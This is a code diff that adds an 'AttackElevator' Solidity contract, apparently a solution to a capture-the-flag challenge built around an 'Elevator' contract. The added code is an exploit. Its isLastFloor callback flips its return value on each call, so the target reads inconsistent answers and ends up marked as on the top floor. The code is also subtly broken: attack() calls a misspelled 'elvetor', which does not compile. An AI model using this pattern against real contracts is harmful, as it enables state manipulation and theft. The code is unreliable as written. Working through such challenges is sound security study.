@@ -18,3 +18,20 @@ contract Elevator {
         }
     }
 }
+
+contract AttackElevator {
+   Elevator elevator;
+   bool flag = true;
+   constructor(address _elevator) {
+        elevator = Elevator(_elevator);
+    }
+    function isLastFloor(uint256) external returns (bool) {
+        flag = !flag;
+        return flag;
+    }
+
+    function attack() public {
+        elvetor.goTo(21);
+
+    }
+}
